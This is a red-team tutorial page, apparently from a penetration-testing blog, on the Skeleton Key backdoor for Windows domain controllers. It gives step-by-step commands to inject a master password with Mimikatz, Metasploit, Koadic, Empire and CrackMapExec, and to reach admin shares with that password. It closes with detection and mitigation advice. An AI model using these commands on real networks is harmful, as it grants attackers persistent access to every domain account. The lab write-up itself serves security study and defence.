@@ -1,0 +1,194 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/persistence/" rel="category tag">Persistence</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">Domain Controller Backdoor: Skeleton Key</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/domain-controller-backdoor-skeleton-key/" rel="bookmark"><time class="entry-date published" datetime="2020-04-25T16:03:31+00:00">April 25, 2020</time><time class="updated" datetime="2025-05-11T21:14:43+00:00">May 11, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">When many people around were fighting the good fight for Net Neutrality, talented people over Dell SecureWorks Counter Threat Unit or CTU discovered a malware that can bypass the authentication on Active Directory Systems around the world. This poses a threat to all those systems that have implemented a single-factor authentication. Multiple Factor Authentication was not a big thing back in those days. The attacker can use a password that they want to authenticate as any user on the targeted server. Due to its nature, it was named Skeleton Key.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Introduction</strong></span>
+<ul>
+<li>Introduction to Windows Authentication</li>
+<li>Skeleton Key and Authentication</li>
+<li>Working of Skeleton Key</li>
+<li>Skeleton Key and Red Teaming</li>
+<li>Pre-Requirements for the Attack</li>
+<li>Scenarios</li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Configurations used in Practical</strong></span></li>
+<li><span style="color: #000000;"><strong>Physical Access</strong></span>
+<ul>
+<li><span style="color: #000000;"><strong>Mimikatz</strong></span>
+<ul>
+<li><span style="color: #000000;">Injecting Key</span></li>
+<li><span style="color: #000000;">Accessing Server Directories</span></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Remote Access</strong></span>
+<ul>
+<li><span style="color: #000000;"><strong>Metasploit Kiwi Module</strong></span>
+<ul>
+<li><span style="color: #000000;">Injecting Key</span></li>
+<li><span style="color: #000000;">Accessing Server Directories</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Koadic Mimikatz_dynwrapx Implant</strong></span>
+<ul>
+<li><span style="color: #000000;">Injecting Key</span></li>
+<li><span style="color: #000000;">Accessing Server Directories</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>E<span style="color: #000000;">mpire skeleton_key Module</span></strong></span>
+<ul>
+<li><span style="color: #000000;">Injecting Key</span></li>
+<li><span style="color: #000000;">Accessing Server Directories</span></li>
+</ul>
+</li>
+<li><strong><span style="color: #000000;">Crackmapexec</span> </strong></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Detection</strong></span></li>
+<li><span style="color: #000000;"><strong>Mitigation</strong></span></li>
+<li><span style="color: #000000;"><strong>References </strong></span></li>
+</ul>
+<h3><span style="color: #800000;">Introduction</span></h3>
+<h4><span style="color: #000000;">Introduction to Windows Authentication</span></h4>
+<p><span style="color: #000000;">Microsoft Windows uses two distinct packages in a network for authentication.</span></p>
+<ul>
+<li><span style="color: #000000;">NTLM</span></li>
+<li><span style="color: #000000;">Kerberos</span></li>
+</ul>
+<p><span style="color: #000000;">These authentication packages include Dynamic Link Libraries (DLLs) that the Local Security Authority Subsystem Service (LSASS) process and client processes actively load.</span></p>
+<p><span style="color: #000000;">Additionally, these two standard authentication packages implement distinct authentication protocols. Specifically, the Kerberos authentication package handles the Kerberos authentication protocol, while the MSV1_0 authentication package manages the NTLM authentication protocol.</span></p>
+<h4><span style="color: #000000;">Skeleton Key and Authentication</span></h4>
+<p><span style="color: #000000;">The Skeleton Key attack tampers with both the authentication methods. During NTLM authentication, the hash of the master password, which is injected in the LASS process, will not be matched with the SAM database. Although it will be matched with the Skeleton Key hash. Therefore, completing the authentication. Kerberos encryption will also be downgraded to an algorithm that doesn’t support salt (RC4_HMAC_MD5), and the hash retrieved from the Active Directory will be replaced with the Skeleton Key hash. The master password hash will be validated server-side. This will lead to successful authentication for Kerberos and NTLM methods.</span></p>
+<h4><span style="color: #000000;">Working of Skeleton Key</span></h4>
+<p><span style="color: #000000;">This Skeleton Key injects itself into LSASS and creates a master password that will work for any account in the domain. After injecting, the attacker can use the Skeleton Key password configured at the time of deployment to log in as any domain user. Real users will still be able to log in using their original passwords. This authentication bypass applies to all services that use single-factor AD authentication, such as webmail and VPNs, and it also allows an attacker with physical access of the compromised system to gain control over the system by entering the injected password physically.</span></p>
+<h4><span style="color: #000000;">Skeleton Key and Red Teaming</span></h4>
+<p><span style="color: #000000;">The Skeleton Key is a post-exploitation technique that can be used by the Red Teams to access the hosts and network resources without the need to crack any passwords of domain users. Skeleton is used to perform the Lateral Movement after getting the initial foothold in the Target Network and/or Systems. Normally, to achieve persistency, malware needs to write something to Disk. The disk is much more exposed to scrutiny. DC is critical for normal network operations, thus (rarely booted). Therefore, DC resident malware like the skeleton key can be diskless and persistent. Benjamin Delpy implemented the technique that the malware is using inside Mimikatz.</span></p>
+<h4><span style="color: #000000;">Pre-Requirements for the Attack</span></h4>
+<p><span style="color: #000000;">To perform this attack, the attacker should have Domain Admin rights. </span></p>
+<p><span style="color: #000000;">Rebooting a domain controller will remove this malware, and it will have to be redeployed by the attacker.</span></p>
+<h4><span style="color: #000000;">Scenarios</span></h4>
+<p><span style="color: #000000;">Let’s talk scenarios, we are going to look at 2 scenarios in general. The first one will be if we have physical access to the clients in the network. Next, we will comprise one of the clients and then inject the skeleton key remotely to the server.</span></p>
+<h3><span style="color: #800000;">Configurations used in Practical</span></h3>
+<p><span style="color: #000000;"><strong>Attacker:</strong></span></p>
+<p><span style="color: #000000;">   <strong> OS:</strong> Kali Linux 2020.1</span></p>
+<p><span style="color: #000000;"><strong>Target</strong>:</span></p>
+<p><span style="color: #000000;">   <strong>Server OS:</strong> Windows Server 2016</span></p>
+<p><span style="color: #000000;">   <strong>Client OS:</strong> Windows 10</span></p>
+<h3><span style="color: #800000;">Physical Access</span></h3>
+<p><span style="color: #000000;">Since we are assuming the physical access of the client, the injected skeleton key is quite similar. We are just trying to explain the working of the skeleton key. Scenarios can vary in the real-world due to an unexhaustive list of variables that can factor in the real world.</span></p>
+<h4><span style="color: #000000;">Mimikatz </span></h4>
+<p><span style="color: #000000;">There is a DLL file for injecting the skeleton key into the memory, but we have Mimikatz that can perform this task very easily.</span></p>
+<h5><span style="color: #000000;"><strong>Injecting Key</strong></span></h5>
+<p><span style="color: #000000;">We run the Mimikatz executable x64 version with Administrator privileges on the Client System directly. This can be done by right-clicking on the Mimikatz executable and choosing the “Run As Administrator” option from the drop-down menu. It will ask for the credentials for the Administrator. Enter the credentials. Then we will see that we have Mimikatz launched. First, we will debug the privilege. We get the OK message, which means we are clear to move ahead. The Skeleton Key was kept in the Misc modules of Mimikatz. We will inject the skeleton key into the memory using the commands shown in the image given. From the OK messages, we can be sure that we have completed the task successfully.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">privilege::debug
+misc::skeleton</pre>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-YDIaUpf2xIE/XqRdCYmcpdI/AAAAAAAAjww/US4aXw6XsmkDUCgOLPC8h11XIpjD3NnZQCLcBGAsYHQ/s1600/1.png" alt="Domain Controller Backdoor using Skeleton Key" width="632" height="333"/></span></p>
+<h5><span style="color: #000000;">Accessing Server Directories</span></h5>
+<p><span style="color: #000000;">Now that we have injected the skeleton key, the server should be accessible to us using the “mimikatz” password. There is a long list of things that we can do from here. But to prove that point we will just take a peep at the Directories of the Server. Lucky for us, we have just the command for it – “net use”.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net use R: \\WIN-S0V7KMTVLD2\admin$ /user:Administrator mimikatz</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xdeSyDs42zU/XqRdH_rGDjI/AAAAAAAAjxM/2c_YCex1XP8Fc2A76xAGqG7LPl9i4kFhACLcBGAsYHQ/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">As soon as we run the previous command, we can see that we have a new drive in the Network Locations. It has the same letter that we mentioned in the command above. Let’s take a peek inside it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-p_sHvuHdGZs/XqRdIVYC1QI/AAAAAAAAjxU/ZG-M0jrSleElEm2HtMpU56Fs2gncARqJQCLcBGAsYHQ/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">This is the directory form the Windows Server. We have all the services and files from the server that are accessible on the client machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-xhDhkWoluXo/XqRdIVItmjI/AAAAAAAAjxQ/dJRhomfjfGsaD6biVlovlN3UWc00SXXEACLcBGAsYHQ/s1600/4.png" alt="Domain Controller Backdoor using Skeleton Key" width="707" height="438"/></span></p>
+<p><span style="color: #000000;">This concludes this scenario. Again, there are a variety of things that can be done now that we have a skeleton injected in the Sever. This is just a convenient example.</span></p>
+<h3><span style="color: #800000;">Remote Access</span></h3>
+<p><span style="color: #000000;">Time to move on to the scenario where we have the remote access of the server and one of the clients in the Network. We are going to use the 3 most prominent Frameworks for the attack. To know about how to compromise a system using these frameworks refer to these articles.</span></p>
+<ol>
+<li><span style="color: #000000;"><a style="color: #000000;" href="https://www.hackingarticles.in/msfvenom-tutorials-beginners/">Metasploit</a></span></li>
+<li><span style="color: #000000;"><a style="color: #000000;" href="https://www.hackingarticles.in/koadic-com-command-control-framework/">Koadic</a></span></li>
+<li><span style="color: #000000;"><a style="color: #000000;" href="https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/">Empire </a></span></li>
+</ol>
+<h4><span style="color: #000000;">Metasploit Kiwi Module</span></h4>
+<p><span style="color: #000000;">First, we will be using the Metasploit Framework. We compromise the system and gain a meterpreter session on DC. After gaining the meterpreter session, we load the kiwi module in the session. This gives us the ability to perform the mimikatz commands directly from the meterpreter. We use the kiwi_cmd command to execute the skeleton injection command into the Sever.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">load kiwi
+kiwi_cmd misc::skeleton</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HdeLKezUjbQ/XqRdI4BwqeI/AAAAAAAAjxY/0cBkzFsEMpAVjpyF-4d5wEauaO-5zNOxACLcBGAsYHQ/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">The work on the Server is done. Now it’s time to compromise the client. After gaining the meterpreter, we run the shell command. Again, to demonstrate the successful injection of the skeleton key we will be using the net use command to gain the server directory. This time we name is disk Y. After executing the net use command, we pop up a PowerShell instance to access the new shared drive. Now, this sounds weird but we tried to access the directory using the cmd prompt but it was not accessible here. Still, we can see that the contents of the Server Directory are accessible here using the password “mimikatz”.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell
+powershell
+net use Y: \\WIN-S0V7RMTVLD2\admin$ /user:Administrator mimikatz
+cd Y:\
+dir</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-EcUPgS2e9j8/XqRdJX9SrBI/AAAAAAAAjxg/VOLimLj0AYs9ZKzNdzInZMnNKFiNC_CbACLcBGAsYHQ/s1600/7.png" alt="Domain Controller Backdoor using Skeleton Key" width="771" height="762"/></span></p>
+<h4><span style="color: #000000;">Koadic</span></h4>
+<p><span style="color: #000000;">Meterpreter is the basic approach. Koadic is a modern one. We gain the session on the server once again. This time we will be using the Koadic implant to inject the skeleton key. After gaining a session, we select the implant with the use command. The name of the implant we plan on using is “mimikatz_dynwrapx”. It gives us a similar functionality as the meterpreter kiwi. We ran the command misc:: skeleton with the help of the MIMICMD function. It injected the skeleton in the Server in no time.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use mimikatz_dynwrapx
+set MIMICMD misc::skeleton
+execute</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_RJ_91J5yJs/XqRdJUgq6OI/AAAAAAAAjxc/jmzAYUsteLMdCqKptOSUdJv27yLfS_3ewCLcBGAsYHQ/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Now that we have successfully injected the skeleton key in the memory of the server. Now we proceed towards gaining the session on one of the client machines. After we got the session, we needed to run the net use command to get access to the server directories. As it’s a Windows native command, we needed to use the exec_cmd implant to execute this command. We can see in the image given below that the implant has shown the reply saying that the command completed successfully.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use implant/manage/exec_cmd
+set CMD net use Y: \\WIN-S0V7KMTVLD2\admin$ /user:Administrator mimikatz
+execute</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-AI4S1EKgZdY/XqRdJw_ePWI/AAAAAAAAjxk/ko_EifASOtA9h5bP8MU5tn_XNO43OIR8gCLcBGAsYHQ/s1600/9.png" alt="Domain Controller Backdoor using Skeleton Key" width="814" height="165"/></span></p>
+<p><span style="color: #000000;">Now we need to take a peek into the newly accessible drive Y. Again, we use the same implant with dir command set to it. This gave us the list of files in the directory hosted on the server. This was possible using the password ‘mimikatz’.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">set CMD dir Y:\
+execute</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AUcIpWVsFDo/XqRdG7IZNKI/AAAAAAAAjw8/P1IVXs_njucsyNlsHDROqSArR_xtMsOmgCLcBGAsYHQ/s1600/10.png"/></span></p>
+<h4><span style="color: #000000;">Empire </span></h4>
+<p><span style="color: #000000;">Two of the frameworks from our agenda are down. Now we turn to the Empire. While working with this framework, we ran into a hiccup. We will talk about it later. But we start with gaining access to the server on Empire.</span></p>
+<p><span style="color: #000000;">After having an Active Agent, we selected the skeleton_key module to inject the skeleton key into the memory of the server. It doesn’t require any twerking. So, we just executed it right off the bat. It was a pretty sweet deal. It ran for a few seconds and then giving the message that the Skeleton key is implanted. We can use Mimikatz as the password to access the server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule persistence/misc/skeleton_key*
+execute</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-5x5Li5f3te0/XqRdGpSUpkI/AAAAAAAAjw0/QzIvIL6xs-MHvRpQgw813JS49Ty9J_RHQCLcBGAsYHQ/s1600/11.png" alt="Domain Controller Backdoor using Skeleton Key" width="680" height="439"/></span></p>
+<p><span style="color: #000000;">This concludes the server business. Now we move to the Client Machine. We gain a session on the Client Machine using Empire.</span></p>
+<h5><strong><span style="color: #000000;">Gaining session on the Client Machine using Empire</span></strong></h5>
+<p><span style="color: #000000;">Now to the hiccup we mentioned. There were a whole bunch of issues running the net use command from the Empire shell. This led us to think outside the box, and we just created a batch file named netuse.bat and wrote the net use command that we want to execute on the Client Machine. It can be observed that the password used to access the server is “mimikatz”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-j99GSRAOFdM/XqRdHWyKHgI/AAAAAAAAjxA/XZ7IAA40VGwgs7VNP3MZlN2J34q15iH3ACLcBGAsYHQ/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Then we threw this batch file to the client machine. This can be done by creating an http server using Python One Liner and using the wget command on the Client Machine to download the batch file. Then we ran this batch file on the target machine. This ran successfully and gave us access to the server directory posed as R:\. We used the dir command to take a peek into it. This is indeed the server directory. This concludes this demonstration of skeleton keys on Windows Server using different methods.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell wget http://192.168.1.112:8000/netuse.bat -outfile netuse.bat
+shell .\netuse.bat
+shell dir R:\</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-43aTfW4W8xE/XqRdHnI6FpI/AAAAAAAAjxE/vjIYICxwPg0VqAOGU-Yyfy-jYE3yMDeHgCLcBGAsYHQ/s1600/13.png" alt="Domain Controller Backdoor using Skeleton Key" width="782" height="904"/></span></p>
+<p><span style="color: #000000;">We broke the security now its time to detect and mitigate this threat.</span></p>
+<h4><span style="color: #000000;">CrackMapExec </span></h4>
+<p><span style="color: #000000;">Since all the basic methods are over. Now its time to shine the light on this very fast and convenient tool that can be used to inject the skeleton remotely onto a Domain Controller.</span></p>
+<p><span style="color: #000000;">The usage of this CrackMapExec is quite simple. You install it using a simple apt install and its good to go. It requires a bunch of things. </span></p>
+<p><span style="color: #000000;"><strong>Requirements:</strong></span></p>
+<p><span style="color: #000000;"><strong>Username:</strong> Administrator</span></p>
+<p><span style="color: #000000;"><strong>Password:</strong> Ignite@987</span></p>
+<p><span style="color: #000000;"><strong>IP Address:</strong> 192.168.1.105</span></p>
+<p><span style="color: #000000;"><strong>Syntax: crackmapexec smb [IP Address] -u ‘[Username]’ -p ‘[Password]’ -M mimikatz -o COMMAND=’misc::skeleton’</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz -o COMMAND='misc::skeleton'</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-hdSTfSouxgQ/XrQGxrQnekI/AAAAAAAAj7s/HpPL5SpXGBoOcFKzHt4FKucuHDT5oaPnwCLcBGAsYHQ/s1600/31.png" border="0" data-original-height="392" data-original-width="1010"/></p>
+<p><strong><span style="color: #000000;">Read More: <a href="https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/">Lateral Moment on Active Directory: CrackMapExec</a></span></strong></p>
+<h3><span style="color: #800000;">Detection</span></h3>
+<p><span style="color: #000000;">The Skeleton Key is not transmitted over the network traffic. Hence, Network-based Intrusion Detection and Intrusion Prevention Systems (IDS/IPS) will not detect this threat.</span></p>
+<p><span style="color: #000000;">Skeleton Key has been detected as a 64-bit DLL file with the following file names:</span></p>
+<ul>
+<li><span style="color: #000000;">msuta64.dll</span></li>
+<li><span style="color: #000000;">ole.dll</span></li>
+<li><span style="color: #000000;">ole64.dll</span></li>
+</ul>
+<p><span style="color: #000000;">Active Directory Domain Controllers may experience replication issues. These kinds of issues led to users to contact the Microsoft Technical Staff. The suggestion they provided was an actual “Reboot” the Server. This, in turn, led to removing the skeleton key from the memory altogether.</span></p>
+<p><span style="color: #000000;">An attacker can use PsExec to perform to create different services. This could lead to the creation of logs at the Windows Service Control Manager log. We can use the SIEM to log events from key servers, like domain controllers, and alerting on the unauthorized use of domain administrator credentials may help in identifying the attacker activity.</span></p>
+<p><span style="color: #000000;">Maintain a process creation audit trail on all workstations and servers. This may lead to the detection of Skeleton Key deployments. Be on the lookout for unexpected PsExec.exe or rundll32.exe process and the running of PsExec.exe with the “-accepteula” parameter. Also, be on the lookout for the following Event IDs:</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-XqUNAij1fbA/XqRdHpx0iGI/AAAAAAAAjxI/ceiADs-h9vEDKSIzofBME5ozRPVAF_QVQCLcBGAsYHQ/s1600/14.png" alt="Domain Controller Backdoor using Skeleton Key" width="482" height="112"/></span></p>
+<h3><span style="color: #800000;">Mitigation</span></h3>
+<ul>
+<li><span style="color: #000000;">Enable the Multi-factor authentication for all remote access applications.</span></li>
+<li><span style="color: #000000;">Reduce the amount of Domain Admins accounts in your Network.</span></li>
+<li><span style="color: #000000;">Ensure Domain Admins cannot logon to lesser privileged machines where their hashes may be subject to be compromised by attackers.</span></li>
+<li><span style="color: #000000;">Prevent untrusted code from running on Domain Controllers.</span></li>
+</ul>
+<h3><span style="color: #800000;">References </span></h3>
+<ul>
+<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://attack.mitre.org/software/S0007/">MITRE ATT&amp;CK</a></strong></span></li>
+<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.secureworks.com/research/skeleton-key-malware-analysis">Dell Secureworks</a></strong></span></li>
+<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview">Microsoft Kerberos Authentication Overview</a></strong></span></li>
+<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm">Microsoft NTLM</a></strong></span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Contact on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
